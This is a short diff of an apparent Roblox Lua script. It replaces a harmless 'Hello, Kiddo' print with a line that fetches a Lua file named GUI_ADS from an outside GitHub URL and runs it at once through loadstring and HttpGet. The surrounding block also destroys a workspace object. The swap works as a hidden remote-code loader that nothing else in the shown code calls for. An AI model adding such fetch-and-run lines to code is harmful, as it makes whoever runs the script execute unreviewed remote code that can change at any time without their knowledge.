@@ -23,7 +23,7 @@ task.spawn(function()
 				game.Workspace.RobloxForwardPortals:Destroy()
 			end
 		end
-		print ("Hello, Kiddo")
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/Kyypie69/Library.UI/refs/heads/main/GUI_ADS.lua.txt"))()
 	end)
 end)
 
